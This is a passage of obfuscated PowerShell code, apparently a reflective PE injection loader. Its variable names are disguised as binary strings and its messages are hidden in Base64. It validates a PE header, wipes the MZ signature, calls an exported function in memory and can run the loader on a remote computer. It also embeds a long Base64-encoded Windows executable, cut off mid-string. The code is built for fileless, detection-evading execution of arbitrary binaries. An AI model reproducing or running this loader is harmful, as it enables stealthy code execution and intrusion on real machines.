            [IntPtr]${00110001110111100} = _00111110101010000 -_10101011101010101 ${_10101011101010101} -_01100000000001000 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
            if (${00110001110111100} -eq [IntPtr]::Zero)
            {
              Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
            }
            ${10011000000111110} = _00010110010100011 @() ([Void])
            ${01010011010100111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00110001110111100}, ${10011000000111110})
            ${01010011010100111}.Invoke() | Out-Null
              }
          }
      }
      elseif ((${_00001100001100000}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${_01000110101000100} -ne [IntPtr]::Zero))
      {
        ${00110001110111100} = _00111110101010000 -_10101011101010101 ${_10101011101010101} -_01100000000001000 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
        if ((${00110001110111100} -eq $null) -or (${00110001110111100} -eq [IntPtr]::Zero))
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
        }
        ${00110001110111100} = _00010111111000011 ${00110001110111100} ${_10101011101010101}
        ${00110001110111100} = _01000001001001111 ${00110001110111100} ${00101100111100111}
        ${00110000110000000} = _00011001110011000 -_01000010000110000 ${_01000110101000100} -_01001010010000001 ${00110001110111100} -Win32Functions $Win32Functions
      }
      if (${_01000110101000100} -eq [IntPtr]::Zero -and ${_00001100001100000}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
      {
        _10010101111000100 -_10101011101010101 ${_10101011101010101}
      }
      else
      {
        ${10111100011001010} = $Win32Functions.VirtualFree.Invoke(${_10101011101010101}, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if (${10111100011001010} -eq $false)
        {
          Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
        }
      }
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
    }
    _10101010110101110
  }
  Function _10101010110101110
  {
    if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
    {
      $DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
    }
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
    ${10100001101011101} = (${_00110111011010011}[0..1] | % {[Char] $_}) -join ''
    if (${10100001101011101} -ne 'MZ')
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAZgBpAGwAZQAuAA==')))
    }
    if (-not ${_10100010010001100}) {
      ${_00110111011010011}[0] = 0
      ${_00110111011010011}[1] = 0
    }
    if (${_00000011111101000} -ne $null -and ${_00000011111101000} -ne '')
    {
      ${_00000011111101000} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQAgACQAewBfADAAMAAwADAAMAAwADEAMQAxADEAMQAxADAAMQAwADAAMAB9AA==')))
    }
    else
    {
      ${_00000011111101000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQA=')))
    }
    if (${_01100010000000010} -eq $null -or ${_01100010000000010} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
    {
      icm -ScriptBlock ${10001000011100111} -ArgumentList @(${_00110111011010011}, ${_10100110010101100}, ${_00010011110000010}, ${_01101111010001101},${_01011101011011001})
    }
    else
    {
      icm -ScriptBlock ${10001000011100111} -ArgumentList @(${_00110111011010011}, ${_10100110010101100}, ${_00010011110000010}, ${_01101111010001101},${_01011101011011001}) -ComputerName ${_01100010000000010}
    }
  }
  _10101010110101110
}
${10101111101111111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABWAHEAUQBBAEEATQBBAEEAQQBBAEUAQQBBAEEAQQAvAC8AOABBAEEATABnAEEAQQBBAEEAQQBBAEEAQQBBAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAEEAQQBBADQAZgB1AGcANABBAHQAQQBuAE4ASQBiAGcAQgBUAE0AMABoAFYARwBoAHAAYwB5AEIAdwBjAG0AOQBuAGMAbQBGAHQASQBHAE4AaABiAG0ANQB2AGQAQwBCAGkAWgBTAEIAeQBkAFcANABnAGEAVwA0AGcAUgBFADkAVABJAEcAMQB2AFoARwBVAHUARABRADAASwBKAEEAQQBBAEEAQQBBAEEAQQBBAEMAOQB0AFMAeQBMACsAZABSAEMAMgBQAG4AVQBRAHQAagA1ADEARQBMAFkAOABLAHoAUgAyAFAAUABVAFEAdABoAE4AdgBrAGYAWgA0AGQAUgBDADIARQAyACsAUgB0AG4AegAxAEUATABZAFQAYgA1AEIAMgBmAHYAVQBRAHQAaABOAHYAawBQAFoALwBkAFIAQwAyAEoAeQB5AFEAOQBuADgAMQBFAEwAWQArAGQAUgBEADIATABEAFUAUQB0AGkATgB2ADAAdgBaACsATgBSAEMAMgBJADIALwB2AGQAagA0ADEARQBMAFkAagBiADkAQQAyAGYAagBVAFEAdABoAFMAYQBXAE4AbwArAGQAUgBDADIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEYAQgBGAEEAQQBCAGsAaABnAFkAQQBEAE4ATwBBAFgAZwBBAEEAQQBBAEEAQQBBAEEAQQBBADgAQQBBAGkAQQBBAHMAQwBEAGgAUQBBAEkAQQBBAEEAQQBDAHcAQQBBAEEAQQBBAEEAQQBEAEkASQBBAEEAQQBBAEIAQQBBAEEAQQBBAEEAQQBFAEEAQgBBAEEAQQBBAEEAQgBBAEEAQQBBAEEAQwBBAEEAQQBHAEEAQQBBAEEAQQBBAEEAQQBBAEEAWQBBAEEAQQBBAEEAQQBBAEEAQQBBAEoAQQBBAEEAQQBBAEUAQQBBAEEAQQBBAEEAQQBBAEEAdwBCAGcAZwBRAEEAQQBFAEEAQQBBAEEAQQBBAEEAQQBCAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCAEEAQQBBAEEAQQBBAEEAQQBBAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAE8AeABCAEEAQQBEAEkAQQBBAEEAQQBBAEgAQQBBAEEATwBBAEIAQQBBAEEAQQBZAEEAQQBBAGYAQQBJAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBJAEEAQQBBAEUAUQBBAEEAQQBBAFEATwBBAEEAQQBjAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEkAQQA0AEEAQQBBAEkAQQBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBNAEEAQQBBAFkAQQBJAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQwA1ADAAWgBYAGgAMABBAEEAQQBBAEUAaAA0AEEAQQBBAEEAUQBBAEEAQQBBAEkAQQBBAEEAQQBBAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQwBBAEEAQQBHAEEAdQBjAG0AUgBoAGQARwBFAEEAQQBFAFkAYgBBAEEAQQBBAE0AQQBBAEEAQQBCAHcAQQBBAEEAQQBrAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAQQBBAEEAQgBBAEwAbQBSAGgAZABHAEUAQQBBAEEARABZAEIAZwBBAEEAQQBGAEEAQQBBAEEAQQBDAEEAQQBBAEEAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFEAQQBBAEEAdwBDADUAdwBaAEcARgAwAFkAUQBBAEEAZgBBAEkAQQBBAEEAQgBnAEEAQQBBAEEAQgBBAEEAQQBBAEUASQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAEEAQQBBAEUAQQB1AGMAbgBOAHkAWQB3AEEAQQBBAE8AQQBCAEEAQQBBAEEAYwBBAEEAQQBBAEEASQBBAEEAQQBCAEcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQgBBAEEAQQBCAEEATABuAEoAbABiAEcAOQBqAEEAQQBCAEUAQQBBAEEAQQBBAEkAQQBBAEEAQQBBAEMAQQBBAEEAQQBTAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUQBBAEEAQQBRAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARQBpAE4AQgBiAGwARwBBAEEARABEAHoATQB6AE0AegBNAHoATQB6AE0AeABJAGkAVQB3AGsAQwBFAGkASgBWAEMAUQBRAFQASQBsAEUASgBCAGgATQBpAFUAdwBrAEkARgBOAFcAVgAwAGkARAA3AEQAQgBJAGkALwBsAEkAagBYAFEAawBXAEwAawBCAEEAQQBBAEEALwB4AFUAQwBJAGcAQQBBAFMASQB2AFkANgBMAHIALwAvAC8AOQBGAE0AOABsAEkAaQBYAFEAawBJAEUAeQBMAHgAMABpAEwAMAAwAGkATABDAFAAOABWADIAeQBFAEEAQQBFAGkARAB4AEQAQgBmAFgAbAB2AEQAegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHgASQBpADgAUgBXAFYAMABGAFUAUQBWAFoAQgBWADAAaQBCADcASQBBAEMAQQBBAEIASQB4ADAAUQBrAEkAUAA3AC8ALwAvADkASQBpAFYAZwBRAFMASQBsAG8ARwBFAGkATABCAFcANAAvAEEAQQBCAEkATQA4AFIASQBpAFkAUQBrAGMAQQBJAEEAQQBFAGkATAAyAFUAaQBKAFQAQwBSAFEAeAAwAFEAawBVAEEARQBCAEEAQQBCAEkAagBWAFEAawBVAEUAaQBOAFQAQwBSAGcALwB4AFYAcgBIAHcAQQBBAFoAZwA5AHYAQgBUAE0AbgBBAEEARAB6AEQAMwA5AEUASgBFAEEAegAvADIAYQBKAGYAQwBRAHcAUwBJADEARQBKAEcAQgBKAHgAOABEAC8ALwAvAC8ALwBTAGYALwBBAFoAawBJADUAUABFAEIAMQA5AGsAaQBOAFYAQwBSAGcAUwBJADEATQBKAEQARABvAFUAUQBnAEEAQQBKAEIASQBqAFUAdwBrAE0ARQB5AEwAUgBDAFEAdwBTAEkAdABVAEoARQBoAEkAZwAvAG8ASQBTAFEAOQBEAHkARQBpAEwAUgBDAFIAQQBUAEkAMABrAFEAVQBpAE4AZABDAFEAdwBTAFEAOQBEADgARQBpAEoAZQB4AEIASQB4ADAATQBZAEQAdwBBAEEAQQBNAFkARABBAEUAMgBMAC8ARQB3AHIALwBrAG0ATAB4ADAAagBSACsARQBpAEwAUwB4AGgASQBnAC8AZwBQAGQASABsAEkATwA4AGgAegBGAEUAZwByAHgAMABpAEwAMABFAGkATAB5ACsAagBmAEMAZwBBAEEAUwBJAGwANwBFAE8AdABXAFMASQBQADQARQBIAE4AYQBTAEkAUAA1AEUASABKAFUAUwBJAHMAcgBUAEkAMQBIAEEAVQBpAEwAMQBVAGkATAB5ACsAagArAEcAdwBBAEEAUwBJAHQAVABHAEUAagAvAHcAawBpAEIAKwBnAEEAUQBBAEEAQgB5AEcARQBpAEQAdwBpAGQASQBpADAAMwA0AFMAQwB2AHAAUwBJADEARgArAEUAaQBEACsAQgA5ADMAWgBrAGkATAA2AFUAaQBMAHoAZQBpAHIARABBAEEAQQBTAE0AZABEAEcAQQA4AEEAQQBBAEIATQBpADAAUQBrAE0ARQBpAEwAVgBDAFIASQBTAEkAbABjAEoAQwBoAEoAagBXADgAQgBTAE4ASAB0AFMAVAB2ADAAUwBBADkASAA3ADAAaQBGADcAWABSAFcAawBFAFEAUAB0AGcANQBJAGkAMABzAFEAUwBJAHQAVABHAEUAZwA3AHkAbgBNAG0AUwBJADEAQgBBAFUAaQBKAFEAeABCAEkAaQA4AE4ASQBnAC8AbwBRAGMAZwBOAEkAaQB3AE4ARQBpAEEAdwBJAHgAawBRAEkAQQBRAEQAcgBEAC8AOABWAG8AaAA4AEEAQQBKAEIASQBpADgAdgBvAG8AUQBnAEEAQQBFAGkARAB4AGcASgBJAC8AOABkAEkATwAvADEAMQB0AFUAaQBMAFYAQwBSAEkAVABJAHQARQBKAEQAQgBJAGcALwBvAEkAYwBqAGgASQBqAFIAUgBWAEEAZwBBAEEAQQBFAG0ATAB3AEUAaQBCACsAZwBBAFEAQQBBAEIAeQBIAEUAaQBEAHcAaQBkAE4AaQAwAEQANABTAFMAdgBBAFMASQBQAEEAKwBFAGkARAArAEIAOQAyAEIALwA4AFYAVABoADgAQQBBAE0AeABKAGkAOABqAG8ANwBRAHMAQQBBAEUAaQBMAHcAMABpAEwAagBDAFIAdwBBAGcAQQBBAFMARABQAE0ANgBIAG8ATABBAEEAQgBNAGoAWgB3AGsAZwBBAEkAQQBBAEUAbQBMAFcAegBoAEoAaQAyAHQAQQBTAFkAdgBqAFEAVgA5AEIAWABrAEYAYwBYADEANwBEAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHgASQBpAFYAdwBrAEMARgBkAEkAZwBlAHgAdwBBAGcAQQBBAFMASQBzAEYAUgBEADAAQQBBAEUAZwB6AHgARQBpAEoAaABDAFIAZwBBAGcAQQBBAE0AOQBMAEgAUgBDAFEAZwBPAEEASQBBAEEARQBpAEwAMgBZADEASwBBAHYAOABWAGcAeAAwAEEAQQBFAGkATAArAEUAaQBEACsAUAA4AFAAaABDAFEAQgBBAEEAQgBJAGoAVgBRAGsASQBFAGkATAB5AFAAOABWAFUAQgAwAEEAQQBFAGkATgBSAEMAUgBNAFMATQBmAEIALwAvAC8ALwAvAHcAOABmAFEAQQBCAEkALwA4AEYAbQBnAHoAeABJAEEASABYADIAUwBJAE4ANwBHAEEAaABNAGkAOAB0AHkAQQAwAHkATABDADAAeQBMAFUAeABCAEkAagBWAFEAawBUAEUAawA3AHkAawAyAEwAdwBrAHcAUABRAHMARgBOAGgAYwBCADAASgBVAGkATgBSAEMAUgBNAFQAQwB2AEkAWgBnADgAZgBoAEEAQQBBAEEAQQBBAEEARAA3AGMAQwBaAGsARQA1AEIAQgBGADEARgBVAGkARAB3AGcASgBKAGcAKwBnAEIAZABlAHgATQBPADkARgB5AEIAZwArAEcAeQBnAEEAQQBBAEUAaQBOAFYAQwBRAGcAUwBJAHYAUAAvAHgAWABiAEgAQQBBAEEAaABjAEEAUABoAEkAZwBBAEEAQQBCAG0AWgBtAFkAUABIADQAUQBBAEEAQQBBAEEAQQBFAGkATgBUAEMAUgBNAFMATQBmAEEALwAvAC8ALwAvAHcAOABmAFEAQQBCAEkALwA4AEIAbQBnAHoAeABCAEEASABYADIAUwBJAE4ANwBHAEEAaABNAGkAOAB0AHkAQQAwAHkATABDADAAeQBMAFUAeABCAEkAagBWAFEAawBUAEUAawA3AHcAawAyAEwAdwBrAHcAUABRAHMAQgBOAGgAYwBCADAASgBVAGkATgBUAEMAUgBNAFQAQwB2AEoAWgBnADgAZgBoAEEAQQBBAEEAQQBBAEEARAA3AGMASwBaAGsARQA1AEQAQgBGADEARQBVAGkARAB3AGcASgBKAGcAKwBnAEIAZABlAHgATQBPADkAQgB5AEEAbgBZACsAUwBJADEAVQBKAEMAQgBJAGkAOAAvAC8ARgBVADgAYwBBAEEAQwBGAHcASABXAEQAUwBJAHYAUAAvAHgAVQB5AEgAQQBBAEEATQA4AEIASQBpADQAdwBrAFkAQQBJAEEAQQBFAGcAegB6AE8AagBZAEMAUQBBAEEAUwBJAHUAYwBKAEkAQQBDAEEAQQBCAEkAZwBjAFIAdwBBAGcAQQBBAFgAOABOAEkAaQA4AC8ALwBGAFEAWQBjAEEAQQBDAEwAUgBDAFEAbwA2ADkARABNAHoATQB6AE0AegBNAHoATQB6AEUAaQBMAHgARgBWAEkAagBXAGkAbwBTAEkASABzAFUAQQBFAEEAQQBFAGoASABSAEMAUgBRAC8AdgAvAC8ALwAwAGkASgBXAEEAaABJAGkAWABBAFEAUwBJAGwANABHAEUAaQBMAEIAWQAwADcAQQBBAEIASQBNADgAUgBJAGkAVQBWAEEAUwBJADEATQBKAEgARABvADUAUAB2AC8ALwAwAGkARABlAEIAZwBRAGMAZwBOAEkAaQB3AEIASQBpADkAQgBJAGoAUQAxAGcASAB3AEEAQQA2AEcAdgA3AC8ALwA5AEkAaQAxAFcASQBTAEkAUAA2AEUASABJADEAUwBQAC8AQwBTAEkAdABNAEoASABCAEkAaQA4AEYASQBnAGYAbwBBAEUAQQBBAEEAYwBoAHgASQBnADgASQBuAFMASQB0AEoAKwBFAGcAcgB3AFUAaQBEAHcAUABoAEkAZwAvAGcAZgBkAGcAZgAvAEYAZABvAGMAQQBBAEQATQA2AEgAdwBKAEEAQQBCAG0ARAAyADgARgBGAEMATQBBAEEAUABNAFAAZgAwAFcAQQBNAC8AWgBtAGkAWABRAGsAYwBFAFMATgBSAGcAeABJAGoAUgBVAGQASAB3AEEAQQBTAEkAMQBNAEoASABEAG8AUQB3AFEAQQBBAEoAQgBJAGoAUQAwAHIASAB3AEEAQQA2AFAAYgA2AC8ALwA5AEkAagBVAHcAawBjAE8AaQBNAC8AZgAvAC8AaQA5AEIASQBqAFEAMAA3AEgAdwBBAEEANgBOADcANgAvAC8AOQBJAGoAVQB3AGsAYwBPAGgAMAAvAGYALwAvAGkALwBoAEkAaQBYAFEAawBXAEUAaQBKAGQAQwBSAG8ARAAxAGYAQQBNADgAQQBQAEUAVQBYAFUARAB4AEYARgA1AEEAOABSAFIAZgBRAFAARQBVAFUARQBEAHgARgBGAEYAQQA4AFIAUgBTAFMASgBSAFQAUQBQAEUAVQBXADQAUwBJAGwARgB5AE0AZABGADAARwBnAEEAQQBBAEIASQBpAFgAUQBrAFkAUAA4AFYAOQBoAG8AQQBBAEUAaQBMAHkARQB5AE4AUgBDAFIAZwBqAFYAWQBnAC8AeABXAFYARwBnAEEAQQBTAEkAdABjAEoARwBCAE0AagBVAFcAUQBTAEkAMABWADcAUgA0AEEAQQBEAFAASgAvAHgAVgBWAEcAZwBBAEEAaABjAEIAMQBGAHYAOABWAHEAeABvAEEAQQBJAHYAUQBTAEkAMABOAHUAaAAwAEEAQQBPAGgATgArAHYALwAvADYAMgAvAEgAUgBaAGcAQgBBAEEAQQBBAFMASQB0AEYAawBFAGkASgBSAFoAegBIAFIAYQBRAEMAQQBBAEEAQQBTAEkAbAAwAEoAQwBoAEkAaQBYAFEAawBJAEUARwA1AEUAQQBBAEEAQQBFAHkATgBSAFoAZwB6ADAAawBpAEwAeQAvADgAVgBEAGgAbwBBAEEASQBYAEEAZABSAGIALwBGAFYAdwBhAEEAQQBDAEwAMABFAGkATgBEAFoATQBkAEEAQQBEAG8ALwB2AG4ALwAvACsAcwBnAC8AeABWAEcARwBnAEEAQQBQAFIAUQBGAEEAQQBCAEkAagBRADIAaQBIAFEAQQBBAGQAQQBkAEkAagBRADIASgBIAGcAQQBBADYATgB6ADUALwAvADkARQBpADgAZQA2AEEAUQBBAEEAQQBMAGsAQQBCAEEAQQBBAC8AeABVAHAARwBnAEEAQQBTAEkAdgBZAC8AeABVAFEARwBnAEEAQQBoAGMAQgAxAEQAawBpAE4ARABYADAAZQBBAEEARABvAHMAUABuAC8ALwArAHMAagBTAEkAdgBUAFMASQAwAE4AagBCADQAQQBBAE8AaQBmACsAZgAvAC8ALwB4AFgAcABHAFEAQQBBAGkAOQBCAEkAagBRADIAZwBIAGcAQQBBADYASQB2ADUALwAvADkATQBqAFUAUQBrAFcATABvAEwAQQBBAEEAQQBTAEkAdgBMAC8AeABXAFEARwBRAEEAQQBpADkAagAvAEYAYwBBAFoAQQBBAEMARgB3AEgAVQBPAFMASQAwAE4AbABSADQAQQBBAE8AaABnACsAZgAvAC8ANgB5AEsATAAwADAAaQBOAEQAYQAwAGUAQQBBAEQAbwBVAFAAbgAvAC8ALwA4AFYAbQBoAGsAQQBBAEkAdgBRAFMASQAwAE4AdwBSADQAQQBBAE8AZwA4ACsAZgAvAC8AUwBJAHQATQBKAEYAagAvAEYAVQBFAFoAQQBBAEQALwBGAFgAcwBaAEEAQQBDAEYAdwBBACsARgBnAEEAQQBBAEEARQBpAE4ARABjAFEAZQBBAEEARABvAEYALwBuAC8ALwAwAGkATgBUAFoAagBvAGIAdgBuAC8ALwAwAGkARABlAEIAZwBRAGMAZwBOAEkAaQB3AEIASQBpADkAQgBJAGoAUQAzAHEASABBAEEAQQA2AFAAWAA0AC8ALwA5AEkAaQAxAFcAdwBTAEkAUAA2AEUASABJADAAUwBQAC8AQwBTAEkAdABOAG0ARQBpAEwAdwBVAGkAQgArAGcAQQBRAEEAQQBCAHkASABFAGkARAB3AGkAZABJAGkAMABuADQAUwBDAHYAQgBTAEkAUABBACsARQBpAEQAKwBCADkAMgBCAC8AOABWAFoAUgBvAEEAQQBNAHoAbwBCAHcAYwBBAEEARQBpAE4ARABZAGcAZQBBAEEARABvAHEALwBqAC8ALwAvADgAVgBwAFIAZwBBAEEATwBzAGkAaQA5AE4ASQBqAFEAMgBpAEgAZwBBAEEANgBKAFgANAAvAC8ALwAvAEYAZAA4AFkAQQBBAEMATAAwAEUAaQBOAEQAYgA0AGUAQQBBAEQAbwBnAGYAagAvAC8AMABpAE4AUgBDAFIAbwBTAEkAbABFAEoAQwBqAEgAUgBDAFEAZwBBAFEAQQBBAEEARQBHADUAQQBnAEEAQQBBAEUAVQB6AHcATABxAEwAQQBRAEEAQQBTAEkAdABNAEoARgBqAC8ARgBYADQAWQBBAEEAQwBMADIAUAA4AFYAbgBoAGcAQQBBAEkAWABBAGQAUQA1AEkAagBRADIAcgBIAGcAQQBBADYARAA3ADQALwAvAC8AcgBJAG8AdgBUAFMASQAwAE4AdwB4ADQAQQBBAE8AZwB1ACsAUAAvAC8ALwB4AFYANABHAEEAQQBBAGkAOQBCAEkAagBRADMAWABIAGcAQQBBADYAQgByADQALwAvADkASQBqAFUAVwA0AFMASQBsAEUASgBFAEIASQBqAFUAWABRAFMASQBsAEUASgBEAGgASQBpAFgAUQBrAE0ARQBpAEoAZABDAFEAbwBpAFgAUQBrAEkARQBVAHoAeQBVAHkATgBCAGQAQQBlAEEAQQBCAEIAagBWAEUAQgBTAEkAdABNAEoARwBqAC8ARgBlAGsAWABBAEEAQwBMADIAUAA4AFYASwBSAGcAQQBBAEkAWABBAGQAUQA1AEkAagBRADMAbQBIAGcAQQBBADYATQBuADMALwAvAC8AcgBJADQAdgBUAFMASQAwAE4ANwBoADQAQQBBAE8AaQA1ADkALwAvAC8ALwB4AFUARABHAEEAQQBBAGkAOQBCAEkAagBRADAASwBIAHcAQQBBADYASwBYADMALwAvACsAUQBTAEkAdABWAGkARQBpAEQAKwBnAGgAeQBPAGsAaQBOAEYARgBVAEMAQQBBAEEAQQBTAEkAdABNAEoASABCAEkAaQA4AEYASQBnAGYAbwBBAEUAQQBBAEEAYwBoAHgASQBnADgASQBuAFMASQB0AEoAKwBFAGcAcgB3AFUAaQBEAHcAUABoAEkAZwAvAGcAZgBkAGcAZgAvAEYAUQA0AFoAQQBBAEQATQA2AEwAQQBGAEEAQQBBAHoAdwBFAGkATABUAFUAQgBJAE0AOAB6AG8AUQBnAFUAQQBBAEUAeQBOAG4AQwBSAFEAQQBRAEEAQQBTAFkAdABiAEUARQBtAEwAYwB4AGgASgBpADMAcwBnAFMAWQB2AGoAWABjAFAATQB6AE0AegBNAHoATQB6AE0AegBNAHgAQQBVADAAaQBEADcAQwBCAEkAaQAxAEUAWQBTAEkAdgBaAFMASQBQADYAQwBIAEkAeABTAEkAcwBKAFMASQAwAFUAVgBRAEkAQQBBAEEAQgBJAGcAZgBvAEEARQBBAEEAQQBjAGgAaABNAGkAMABIADQAUwBJAFAAQwBKADAAawByAHkARQBpAE4AUQBmAGgASQBnAC8AZwBmAGQAeAA5AEoAaQA4AGoAbwBQAEEAVQBBAEEARABQAEEAUwBNAGQARABHAEEAYwBBAEEAQQBCAEkAaQBVAE0AUQBaAG8AawBEAFMASQBQAEUASQBGAHYARAAvAHgAVgAzAEcAQQBBAEEAegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAFEARgBOAFYAVgBsAGQAQgBWAEUARgBXAFEAVgBkAEkAZwArAHcAZwBTAEkAdABwAEcARQAyAEwAOABFAHkATAA0AGsAaQBMACsAVQB3ADcAeABYAGMAcwBTAEkAdgB4AFMASQBQADkAQwBIAEkARABTAEkAcwB4AFMANAAwAGMAQQBFAHkASgBjAFIAQgBNAGkAOABOAEkAaQA4ADcAbwArAFIATQBBAEEARQBVAHoALwAyAFoARQBpAFQAdwB6ADYAZgA4AEEAQQBBAEIASQB1AC8ANwAvAC8ALwAvAC8ALwAvADkALwBUAEQAdgB6AEQANABjAEYAQQBRAEEAQQBTAFkAdgBPAFMASQBQAEoAQgAwAGcANwB5ADMAYwBmAFMASQB2AFYAUwBJAHYARABTAE4ASABxAFMAQwB2AEMAUwBEAHYAbwBkAHcANQBJAGoAUQBRAHEAUwBJAHYAWgBTAEQAdgBJAFMAQQA5AEMAMgBFAFUAegAvADAAaQBOAFEAdwBGAEkAdQBmAC8ALwAvAC8ALwAvAC8ALwA5AC8AUwBJADAAVQBBAEUAMgBOAFIALwA5AEkATwA4AEYAMgBCAFUAbQBMADAATwBzAEoAUwBJAEgANgBBAEIAQQBBAEEASABJAG4AUwBJADEASwBKADAAZwA3AHkAawBrAFAAUgBzAGoAbwBEAFEAUQBBAEEARQBpAEYAdwBBACsARQBqAGcAQQBBAEEARQBpAE4AYwBDAGQASQBnACsAYgBnAFMASQBsAEcAKwBPAHMAVgBTAEkAWABTAGQAQQAxAEkAaQA4AHIAbwA2AFEATQBBAEEARQBpAEwAOABPAHMARABTAFkAdgAzAFMASQBsAGYARwBFAG0ATAAxAEUAdQBOAEgARABaAE0AaQBYAGMAUQBUAEkAdgBEAFMASQB2AE8ANgBDAFkAVABBAEEAQgBtAFIASQBrADgATQAwAGk